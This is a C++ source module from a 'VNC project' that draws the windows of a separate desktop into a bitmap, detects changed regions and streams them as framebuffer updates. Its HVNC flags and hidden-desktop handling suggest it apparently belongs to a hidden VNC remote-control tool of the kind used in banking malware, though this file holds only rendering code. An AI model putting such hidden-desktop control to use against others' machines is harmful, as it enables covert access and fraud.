//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: scr.cpp
// $Revision: 194 $
// $Date: 2014-07-11 16:55:06 +0400 (Пт, 11 июл 2014) $
// description:
//	GdiPlus support module. Screenshot generation engine.

#include "project.h"
#include "bmp.h"
#include "scr.h"
#include "cpu.h"

#pragma warning(disable:4244)

typedef struct _WND_INFO
{
	RECT rcWnd;
	DWORD dwWidth;
	DWORD dwHeight;
	BOOL bScrollBars;
	RECT rcHScroll;
	RECT rcVScroll;
	PVNC_SESSION pSession;
	RECT rcDraw; // drawing rect
	BOOL bDrawChilds;
}WND_INFO,*PWND_INFO;

//////////////////////////////////////////////////////////////////////////
// screen shot

BOOL PrintWindowEx(HWND hWnd,HDC hDC,UINT dwFlags)
{
	BOOL bRet=FALSE;
//	DWORD_PTR Result;

	int i;
	for ( i=0; i <= 10; i++ )
	{
		if (!IsWindow(hWnd))
			break;

		RedrawWindow(hWnd,NULL,NULL,RDW_ERASE | RDW_INVALIDATE | RDW_FRAME | RDW_ALLCHILDREN);
		if ( PrintWindow ( hWnd, hDC, dwFlags ) )
		{
			bRet=TRUE;
			break;
		}
		Sleep(0);
	}
	return bRet;
}

VOID DrawBadWindow( PVNC_SESSION pSession, HWND hWnd,HDC hDC, LPRECT lpRect, BOOL SendPrint)
{
	RECT rect=*lpRect;
	DWORD_PTR Result = 0xDEAD;
	LRESULT lResult;
	BOOL bDrawOK = TRUE;

	if ( SendPrint )
	{
		lResult = 
			SendMessageTimeout(
				hWnd, SS_GET_DATA(pSession)->dwVNCMessage,VMW_PRINT_SCREEN,0,
				SMTO_ABORTIFHUNG | SMTO_NORMAL | SMTO_NOTIMEOUTIFNOTHUNG,
				WND_MSG_TIMEOUT,
				&Result
				);
		bDrawOK = (lResult && (Result == 0xDEAD ));
	}else{
		RedrawWindow(hWnd,NULL,NULL,RDW_ERASE | RDW_INVALIDATE | RDW_FRAME | RDW_ALLCHILDREN);
	}

	if ( bDrawOK )
	{
		BmpCopyScreenBuffer(pSession,lpRect,FALSE);
		GdiFlush();
		BitBlt ( 
			hDC,
			0,0,
			rect.right  - rect.left,
			rect.bottom - rect.top,
			pSession->Desktop.hIntermedMemDC,
			rect.left,rect.top,
			SRCCOPY
			);
	}
	else
	{
		RECT rc={0};
		rc.bottom = rect.bottom - rect.top;
		rc.right  = rect.right  - rect.left;
		FillRect(hDC,&rc,hBlackBrush);
		DrawEdge(hDC,&rc,EDGE_SUNKEN,BF_RECT);
		DbgPrint("VMW_PRINT_SCREEN is not okay\n");
	}
	return;
}

HRGN GetRgn( HWND hWnd, HDC hDC )
{
	HRGN hRgn=NULL;

	while (IsWindow(hWnd))
	{
		RECT rect;
		GetWindowRect(hWnd,&rect);
		hRgn = 
			CreateRectRgn(
				rect.left,
				rect.top,
				rect.right,
				rect.bottom
				);
		if (GetWindowRgn(hWnd,hRgn) == COMPLEXREGION)
		{
			OffsetRgn(hRgn,rect.left,rect.top);
			SelectClipRgn(hDC,hRgn);
			break;
		}
		DeleteObject(hRgn);
		hWnd=GetParent(hWnd);
	}
	return hRgn;
}

VOID DrawRegion(HWND hWnd,HDC hDCTo,HDC hDCFrom,RECT *lpRect,int dwX,int dwY)
{
	RECT rect = *lpRect;
	//HRGN hRgn = GetRgn(hWnd,hDCTo);

	BitBlt(hDCTo,rect.left,rect.top,rect.right-rect.left,rect.bottom-rect.top,hDCFrom,dwX,dwY,SRCCOPY);

	//SelectClipRgn(hDCTo,NULL);
	//DeleteObject(hRgn);
	return;
}

BOOL DrawWindow(PVNC_SESSION pSession,HWND hWnd,HDC hDCTo,HDC hDCFrom, LPRECT Rect)
{
	BOOL fbResult = FALSE;
	RECT rcWndRect,rcIntersect;
	LONG_PTR dwFlags;

	do {
		if ((!IsWindowEx(&pSession->Desktop,hWnd)) || (!IsWindowVisibleEx(hWnd)))
		{
			break;
		}
		dwFlags = GetWindowClassFlags(&pSession->Desktop,hWnd);
		if ( dwFlags & WCF_PAINTMETHOD_NOP ){
			break;
		}
		GetWindowRect(hWnd,&rcWndRect);
		//check if we need to draw this window
		rcIntersect = rcWndRect;

		if ( !IsXP() && (hWnd == pSession->Desktop.hStartBtnWnd )){
			if (!PrintWindowEx(hWnd,hDCFrom,0)){
				//break;
				DrawBadWindow(pSession,hWnd,hDCFrom,&rcIntersect,TRUE);
			}
		}else {
			LONG_PTR dwClassStyle = GetClassLongPtr(hWnd,GCL_STYLE);
			// draw window
			if (( (dwClassStyle & (CS_CLASSDC|CS_PARENTDC))) || (dwFlags & (WCF_JAVA|WCF_JOPERA|WCF_OPERA)) )
			{
				DrawBadWindow(pSession,hWnd,hDCFrom,&rcIntersect,TRUE);
			}
			else
			{
				if (!PrintWindowEx(hWnd,hDCFrom,0)){
					break;
				}
			}
			DrawRegion(hWnd,hDCTo,hDCFrom,&rcIntersect,0,0);
		}
		fbResult = TRUE;

	} while ( FALSE );
	return fbResult;
}

BOOL 
	DrawChildWindow(
		PVNC_SESSION pSession,
		HWND hWnd,
		HDC hDCTo,
		HDC hDCFrom,
		PWND_INFO lpWndInfo
		)
{
	WINDOWINFO wiInfo;
	int dwX=0,dwY=0;
	RECT rcIntersect;
	DWORD dwClassFlags = 0;

	if ((!IsWindowEx(&pSession->Desktop,hWnd)) || (!IsWindowVisibleEx(hWnd))){
		return FALSE;
	}

	wiInfo.cbSize=sizeof(WINDOWINFO);
	GetWindowInfo(hWnd,&wiInfo);

	if (((wiInfo.dwStyle & BS_TYPEMASK) == BS_GROUPBOX) && (GetClassHash(hWnd) == HASH_BUTTON))
	{
		TCHAR szt[128];
		if ( GetWindowText(hWnd,szt,sizeof(szt)/sizeof(szt[0])) == 0 )
		{
			ShowWindow(hWnd,SW_HIDE);
			return FALSE;
		}
		return TRUE;
	}

	if ((wiInfo.rcWindow.right <= lpWndInfo->rcWnd.left) || 
		(wiInfo.rcWindow.left >= lpWndInfo->rcWnd.right) || 
		(wiInfo.rcWindow.bottom <= lpWndInfo->rcWnd.top) ||
		(wiInfo.rcWindow.top >= lpWndInfo->rcWnd.bottom))
	{
		return FALSE;
	}

	if ( !IsXP() )
	{
		if ( !lpWndInfo->bDrawChilds )
		{
			DWORD ClassFlags = GetWindowClassFlags(&pSession->Desktop,hWnd);
			if ( (ClassFlags & WCF_DRAW_CHILD) != WCF_DRAW_CHILD )
			{
				// need to redraw child controls 
				// for Internet explorer
				return TRUE;
			}
		}
	}

	// check if we need to draw the window
	rcIntersect = wiInfo.rcWindow;

	dwClassFlags = GetWindowClassFlags(&pSession->Desktop,hWnd);
	if ((( (GetClassLongPtr(hWnd,GCL_STYLE) & (CS_CLASSDC|CS_PARENTDC)))) || 
		(dwClassFlags & (WCF_JAVA|WCF_OPERA | WCF_JOPERA)) )
	{
		DrawBadWindow(pSession,hWnd,hDCFrom,&rcIntersect,TRUE);
	}
	else
	{
		if (!PrintWindowEx(hWnd,hDCFrom,0)){
			return FALSE;
		}
	}

	if ( wiInfo.rcWindow.bottom > lpWndInfo->rcWnd.bottom )
	{
		wiInfo.rcWindow.bottom = lpWndInfo->rcWnd.bottom - 2;
		if ( lpWndInfo->bScrollBars ){
			wiInfo.rcWindow.bottom -= lpWndInfo->rcHScroll.bottom-lpWndInfo->rcHScroll.top;
		}
	}

	
	if (wiInfo.rcWindow.top < lpWndInfo->rcWnd.top)
	{
		dwY = lpWndInfo->rcWnd.top - wiInfo.rcWindow.top + 2;
		wiInfo.rcWindow.top = lpWndInfo->rcWnd.top + 2;
	}
	if (wiInfo.rcWindow.right > lpWndInfo->rcWnd.right)
	{
		wiInfo.rcWindow.right = lpWndInfo->rcWnd.right-2;
		if (lpWndInfo->bScrollBars){
			wiInfo.rcWindow.right -= lpWndInfo->rcVScroll.right - lpWndInfo->rcVScroll.left;
		}
	}
	if (wiInfo.rcWindow.left < lpWndInfo->rcWnd.left)
	{
		dwX = lpWndInfo->rcWnd.left - wiInfo.rcWindow.left+2;
		wiInfo.rcWindow.left = lpWndInfo->rcWnd.left+2;
	}

	// check if we need to draw the window
	rcIntersect = wiInfo.rcWindow;
	DrawRegion(hWnd,hDCTo,hDCFrom,&rcIntersect,dwX,dwY);
	return TRUE;
}

VOID FillRectInfo(HWND hWnd,WND_INFO *lpWndInfo,WND_INFO *lpParentWndInfo)
{
	GetWindowRect(hWnd,&lpWndInfo->rcWnd);
	lpWndInfo->dwWidth=lpWndInfo->rcWnd.right-lpWndInfo->rcWnd.left;
	lpWndInfo->dwHeight=lpWndInfo->rcWnd.bottom-lpWndInfo->rcWnd.top;

	if (lpWndInfo->rcWnd.left < 0)
		lpWndInfo->rcWnd.left=0;
	if (lpWndInfo->rcWnd.top < 0)
		lpWndInfo->rcWnd.top=0;

	if (GetWindowLongPtr(hWnd,GWL_STYLE) & (WS_VSCROLL|WS_HSCROLL))
	{
		SCROLLBARINFO sbiInfo;
		sbiInfo.cbSize=sizeof(sbiInfo);
		if (GetScrollBarInfo(hWnd,OBJID_HSCROLL,&sbiInfo))
		{
			lpWndInfo->bScrollBars = TRUE;
			memcpy(&lpWndInfo->rcHScroll,&sbiInfo.rcScrollBar,sizeof(RECT));
		}
		if (GetScrollBarInfo(hWnd,OBJID_VSCROLL,&sbiInfo))
		{
			lpWndInfo->bScrollBars = TRUE;
			memcpy(&lpWndInfo->rcVScroll,&sbiInfo.rcScrollBar,sizeof(RECT));
		}
	}

	if (lpParentWndInfo)
	{
		if (lpWndInfo->rcWnd.bottom > lpParentWndInfo->rcWnd.bottom)
		{
			lpWndInfo->rcWnd.bottom=lpParentWndInfo->rcWnd.bottom;
			if (lpParentWndInfo->bScrollBars)
				lpWndInfo->rcWnd.bottom-=lpParentWndInfo->rcHScroll.bottom-lpParentWndInfo->rcHScroll.top;
		}
		if (lpWndInfo->rcWnd.top < lpParentWndInfo->rcWnd.top)
			lpWndInfo->rcWnd.top=lpParentWndInfo->rcWnd.top;
		if (lpWndInfo->rcWnd.right > lpParentWndInfo->rcWnd.right)
		{
			lpWndInfo->rcWnd.right=lpParentWndInfo->rcWnd.right;
			if (lpParentWndInfo->bScrollBars)
				lpWndInfo->rcWnd.right-=lpParentWndInfo->rcVScroll.right-lpParentWndInfo->rcVScroll.left;
		}
		if (lpWndInfo->rcWnd.left < lpParentWndInfo->rcWnd.left)
			lpWndInfo->rcWnd.left=lpParentWndInfo->rcWnd.left;

		lpWndInfo->bDrawChilds = lpParentWndInfo->bDrawChilds;
	}
	return;
}

VOID EnumChilds(HWND hWnd,WND_INFO *lpWndInfo)
{
	PVNC_SESSION pSession = lpWndInfo->pSession;
	do
	{
		if (IsWindowEx(&pSession->Desktop,hWnd))
		{
			WND_INFO wiWndInfo={0};
			if ( DrawChildWindow(
				pSession,
				hWnd,
				pSession->Desktop.hCompDC,
				pSession->Desktop.hTmpCompDC,
				lpWndInfo
				))
			{
				FillRectInfo(hWnd,&wiWndInfo,lpWndInfo);
				wiWndInfo.pSession=lpWndInfo->pSession;
				wiWndInfo.rcDraw = lpWndInfo->rcDraw;
				EnumChilds(GetWindow(GetWindow(hWnd,GW_CHILD),GW_HWNDLAST),&wiWndInfo);
			}
		}
	}
	while (hWnd=GetWindow(hWnd,GW_HWNDPREV));
	return;
}

VOID DrawWnd( PVNC_SESSION pSession, HWND hWnd, LPRECT Rect, BOOL DrawChilds )
{
	if ((IsWindowEx(&pSession->Desktop,hWnd)) && (!IsIconic(hWnd)))
	{
		if ( DrawWindow(pSession,hWnd,pSession->Desktop.hCompDC,pSession->Desktop.hTmpCompDC,Rect) )
		{
			// do not redraw childs on vista
			//if ( !IsVISTA() )
			{
				WND_INFO wiWndInfo={0};
				FillRectInfo(hWnd,&wiWndInfo,NULL);
				wiWndInfo.pSession = pSession;
				wiWndInfo.rcDraw = *Rect;
				wiWndInfo.bDrawChilds = DrawChilds;
				EnumChilds(GetWindow(GetWindow(hWnd,GW_CHILD),GW_HWNDLAST),&wiWndInfo);
			}
		}
	}
	return;
}

VOID MakeSShot( PVNC_SESSION pSession, LPRECT Rect )
{
	RECT DrawRect;
	int i;

	if ( Rect ){
		DrawRect = *Rect;
	}else{
		DrawRect.left = 0;
		DrawRect.right = pSession->Desktop.dwWidth;
		DrawRect.top = 0;
		DrawRect.bottom = pSession->Desktop.dwHeight;
	}

	if ( pSession->Desktop.dwFlags & HVNC_USE_BITBLT){
		BitBlt(
			pSession->Desktop.hCompDC,
			Rect->left,Rect->top,
			Rect->right - Rect->left,
			Rect->bottom - Rect->top,
			pSession->Desktop.hDC,
			0,0,SRCCOPY
			);
	}
	else
	{
		HWND WndsList[500],WndsOnTopList[100];
		int dwWndsList=0,dwWndsOnTopList=0;

		WW_LockWndList( pSession );
		{
			PZ_ORDER_LIST_ITEM lpWnd = pSession->Desktop.WndWatcher.lpZOrderList;
			while (lpWnd)
			{
				lpWnd->bHidden = (IsWindowVisibleEx(lpWnd->hWnd) == FALSE);
				if (/*(!lpWnd->bOverlapped) && */(!lpWnd->bHidden) && (lpWnd->hWnd != pSession->Desktop.hProgmanWnd))
				{
					if ((!((GetWindowLongPtr(lpWnd->hWnd,GWL_STYLE) & WS_CHILD) && 
						(WW_GetWndFromList(pSession,GetParent(lpWnd->hWnd))))) && (lpWnd->hWnd !=  pSession->Desktop.hTrayWnd))
					{
						if (!WW_IsItMsgBox(pSession,lpWnd->hWnd))
						{
							if ((lpWnd->bTopMost) && (!(GetWindowClassFlags(&pSession->Desktop,lpWnd->hWnd) & WCF_PAINT_ALWAYS_BOTTOM))){
								WndsOnTopList[dwWndsOnTopList++]=lpWnd->hWnd;
							}
							else {
								WndsList[dwWndsList++]=lpWnd->hWnd;
							}
						}
					}
				}
				lpWnd=lpWnd->lpNext;
			}
		}
		WW_UnlockWndList( pSession );

		if (!IsXP()){
			DWORD_PTR Result;
			SendMessageTimeout(
				pSession->Desktop.hDeskWnd,
				SS_GET_DATA(pSession)->dwVNCMessage,
				VMW_ERASEBKG,
				0,
				SMTO_ABORTIFHUNG | SMTO_NORMAL,
				WND_MSG_TIMEOUT,
				&Result
				);
		}

#if 1
		// this fixes bug with vista screen blinking
		if ( pSession->Desktop.hDeskListView ){
			DrawWnd(pSession,pSession->Desktop.hDeskListView,&DrawRect,FALSE);
		}
		else
		{
			DrawWnd(pSession,pSession->Desktop.hProgmanWnd,&DrawRect,FALSE);
		}

		for ( i=0; i < dwWndsList; i++ ){
			DrawWnd(pSession,WndsList[i],&DrawRect,FALSE);
		}

		if ((SS_GET_DATA(pSession)->hForegroundWnd == pSession->Desktop.hProgmanWnd) || 
			(!IsWindowInFullScreenMode(&pSession->Desktop,SS_GET_DATA(pSession)->hForegroundWnd)))
		{
			DrawWnd(pSession,pSession->Desktop.hTrayWnd,&DrawRect,TRUE);
		}
		for ( i=0; i < dwWndsOnTopList; i++){
			DrawWnd(pSession,WndsOnTopList[i],&DrawRect,FALSE);
		}
#else
		DrawWndX(pSession->Desktop.hProgmanWnd,pSession->Desktop.hCompDC,pSession->Desktop.hTmpCompDC);
		for ( i=0; i < dwWndsList; i++ ){
			DrawWndX(WndsList[i],pSession->Desktop.hCompDC,pSession->Desktop.hTmpCompDC);
		}

		if ((SS_GET_DATA(pSession)->hForegroundWnd == pSession->Desktop.hProgmanWnd) || 
			(!IsWindowInFullScreenMode(&pSession->Desktop,SS_GET_DATA(pSession)->hForegroundWnd)))
		{
			DrawWndX( pSession->Desktop.hTrayWnd,pSession->Desktop.hCompDC,pSession->Desktop.hTmpCompDC);
		}
		for ( i=0; i < dwWndsOnTopList; i++){
			DrawWndX( WndsOnTopList[i],pSession->Desktop.hCompDC,pSession->Desktop.hTmpCompDC );
		}
#endif

		//TODO:
#if 0
		if (pSession->TaskSwitcherInfo.bTaskSwitcherIsShown)
		{
			DrawWnd(lpServer,lpServer->TaskSwitcherInfo.hTaskSwitcherWnd);
		}
		else 
#endif
		{
			if ( pSession->Desktop.bMoving ){
				//FrameRect( pSession->Desktop.hCompDC,&pSession->Desktop.rcMovingWnd,hFrameBrush);
			}
	}
#if 0
	if ( pSession->Desktop.dwFlags & HVNC_DRAW_USER_CURSOR ){
		DrawIcon(
			pSession->Desktop.hCompDC,
			SS_GET_DATA(pSession)->ptCursor.x - iiCur.xHotspot,
			lpServer->lpGlobalVNCData->ptCursor.y-iiCur.yHotspot,
			hArrow
			);
#endif
	}
	return;
}

///////////////////////////////////////////////////////////////////////
// milliseconds since January 1, 1601 

ULONGLONG _Now( VOID )
{
	SYSTEMTIME st;
	ULONGLONG  ft;
	GetSystemTime( &st );
	//st.wHour = st.wMinute = st.wSecond = 0;
	//st.wMilliseconds = 1;
	SystemTimeToFileTime(&st, (LPFILETIME) &ft);
	return ft/10000;
}

//////////////////////////////////////////////////////////////////////////
// desktop bitmap update thread
VOID CALLBACK SrcDesktopUpdateThread ( PVNC_SESSION pSession )
{
	HANDLE hWaitEvents[2];
	DWORD dwWaitObj;
	BOOL bDeep = TRUE;
	DWORD dwSleep = 100;
	DWORD dwIteration = 0;

	BOOL fbExit = FALSE;

	ULONGLONG newtick,oldtick,oldtick2;
	int fullpollcounter=0;

	short cpuUsage = 0;
	DWORD MIN_UPDATE_INTERVAL = 33;
	DWORD MIN_UPDATE_INTERVAL_MAX = 500;
	DWORD MIN_UPDATE_INTERVAL_MIN = 33;
	DWORD MAX_CPU_USAGE = 20;
	BOOL fbUpdated = FALSE;
	BOOL fbUpdateRequested = FALSE;
	BOOL fbIncrement = FALSE;

	SetThreadDesktop(pSession->Desktop.hDesktop);

	oldtick  = _Now();
	oldtick2 = _Now();

	hWaitEvents[0] = pSession->SharedSection.hStatusEvent;
	hWaitEvents[1] = pSession->Desktop.hScreenUpdateEvent;

	while( !fbExit )
	{
		RECT rc;
		HRGN rgn = NULL;
		LPRGNDATA region_data = NULL;
		DWORD buffsize;

		DWORD nRects;
		LPRECT pRectangles = NULL;
		int i = 0;

		dwWaitObj = WaitForMultipleObjects(2, hWaitEvents, FALSE, fbUpdateRequested ? MIN_UPDATE_INTERVAL : INFINITE/*5000*/ );
		if ( dwWaitObj == WAIT_OBJECT_0 ){
			break;
		}else if ( dwWaitObj == WAIT_OBJECT_0 + 1 ){ // frame buffer update
			fbUpdateRequested = TRUE;
			rc = pSession->Rect;
			fbIncrement = pSession->Incremental;
			fbUpdated = FALSE;

		}else if ( dwWaitObj == WAIT_TIMEOUT ){
			// TEST we disable inc updates
			// fbIncrement = FALSE;
		}else{
			break; //error
		}

#ifndef _DISABLE_CPU_LIMIT
		//measure current cpu usage of vnc
		if ( fullpollcounter == 10 || fullpollcounter==0 || fullpollcounter == 5) {
			cpuUsage = CpuGetUsage();
		}
		if (cpuUsage > 30 ) {
			MIN_UPDATE_INTERVAL+=10;
		}
		else {
			MIN_UPDATE_INTERVAL-=10;
		}

		if ( MIN_UPDATE_INTERVAL < MIN_UPDATE_INTERVAL_MIN ) {
			MIN_UPDATE_INTERVAL = MIN_UPDATE_INTERVAL_MIN;
		}
		if ( MIN_UPDATE_INTERVAL > MIN_UPDATE_INTERVAL_MAX ) {
			MIN_UPDATE_INTERVAL = MIN_UPDATE_INTERVAL_MAX;
		}

		newtick = _Now(); 
		if ((newtick-oldtick)<MIN_UPDATE_INTERVAL)
		{
			if ( WaitForSingleObject(
					pSession->SharedSection.hStatusEvent,
					MIN_UPDATE_INTERVAL-(DWORD)(newtick-oldtick)
				) != WAIT_TIMEOUT )
			{
				break; //exit
			}
		}
#endif

		// lock painting
		ScrLockPainting(pSession);
		// make screen bitmap
		MakeSShot( pSession, &rc );
		ScrUnlockPainting(pSession);

		// send full update
		if ( !fbIncrement )
		{
			rc.left = 0;
			rc.top = 0;
			rc.right = pSession->Desktop.dwWidth;
			rc.bottom = pSession->Desktop.dwHeight;

			RfbSendFramebufferUpdate(pSession->RfbSession,1,&rc);

			dwIteration = 0;
			fbUpdateRequested = FALSE; //
			continue;
		}
			
		//unlock painting
		if ( dwIteration > 5 )
		{
			dwIteration=0;
			bDeep = TRUE;
		}
		ScrLockPainting(pSession);
		rgn = FastDetectChanges(pSession,&rc, bDeep);
		ScrUnlockPainting(pSession);

		do{
			if ( rgn == NULL ){
				break;
			}

			buffsize = GetRegionData(rgn, 0, NULL);
			if ( buffsize == 0 ){
				break;
			}

			region_data = hAlloc ( buffsize );
			if ( region_data == NULL ){
				break;
			}
			buffsize = GetRegionData(rgn, buffsize, region_data);
			if ( buffsize == 0 ){
				break;
			}

			nRects = region_data->rdh.nCount;
			pRectangles = (LPRECT)region_data->Buffer;
			if ( nRects == 0 ){
				break;
			}

			// push the update
			RfbSendFramebufferUpdate(pSession->RfbSession,nRects,pRectangles);

		} while ( FALSE );

		if ( fbUpdated ){
			fbUpdateRequested = FALSE; //
		} else {
			//DbgPrint("[SrcDesktopUpdateThread] no changes\n");
		}

		if ( region_data ){
			hFree ( region_data );
		}
		if ( rgn ){
			DeleteObject( rgn );
		}
		dwIteration++;
	}
	return;
}

WINERROR ScrStartUpdateThread( PVNC_SESSION pSession )
{
	WINERROR Error = NO_ERROR;
	DWORD ThreadID = 0;

	do {
		pSession->Desktop.hPaintingMutex = CreateMutex(NULL,FALSE,NULL);
		if ( !pSession->Desktop.hPaintingMutex ){
			Error = GetLastError();
			break;
		}
		pSession->Desktop.hScreenUpdateEvent = CreateEvent ( NULL, FALSE, FALSE, NULL );
		if ( !pSession->Desktop.hScreenUpdateEvent ){
			Error = GetLastError();
			break;
		}
		pSession->Desktop.hScreenThread =
			CreateThread( 
				NULL, 0, 
				(LPTHREAD_START_ROUTINE)SrcDesktopUpdateThread, 
				pSession, 0, 
				&ThreadID 
				);
		if ( pSession->Desktop.hScreenThread == NULL ){
			Error = GetLastError();
			break;
		}
	}while ( FALSE );

	if ( Error != NO_ERROR ){
		if ( pSession->Desktop.hScreenUpdateEvent ){
			CloseHandle ( pSession->Desktop.hScreenUpdateEvent );
			pSession->Desktop.hScreenUpdateEvent = NULL;
		}
		if ( pSession->Desktop.hPaintingMutex ){
			CloseHandle ( pSession->Desktop.hPaintingMutex );
			pSession->Desktop.hPaintingMutex = NULL;
		}
	}

	return Error;
}

VOID ScrStopUpdateThread( PVNC_SESSION pSession )
{
	if ( pSession->Desktop.hScreenUpdateEvent ){
		SetEvent ( pSession->Desktop.hScreenUpdateEvent );
	}
	if ( pSession->Desktop.hScreenThread ){
		WaitForSingleObject( pSession->Desktop.hScreenThread, INFINITE);
		CloseHandle( pSession->Desktop.hScreenThread );
		pSession->Desktop.hScreenThread = NULL;
	}

	if ( pSession->Desktop.hScreenUpdateEvent ){
		CloseHandle ( pSession->Desktop.hScreenUpdateEvent );
		pSession->Desktop.hScreenUpdateEvent = NULL;
	}

	if ( pSession->Desktop.hPaintingMutex ){
		CloseHandle ( pSession->Desktop.hPaintingMutex );
		pSession->Desktop.hPaintingMutex = NULL;
	}
}

VOID ScrLockPainting( PVNC_SESSION pSession )
{
	WaitForSingleObject(pSession->Desktop.hPaintingMutex, INFINITE);
}

VOID ScrUnlockPainting( PVNC_SESSION pSession )
{
	ReleaseMutex(pSession->Desktop.hPaintingMutex);
}

// ---- Startup and cleanup routines -------------------------------------------------------------------------------------

WINERROR ScrStartup(VOID)
{
	WINERROR Status = NO_ERROR;

	return(Status);
}


VOID ScrCleanup(VOID)
{
}

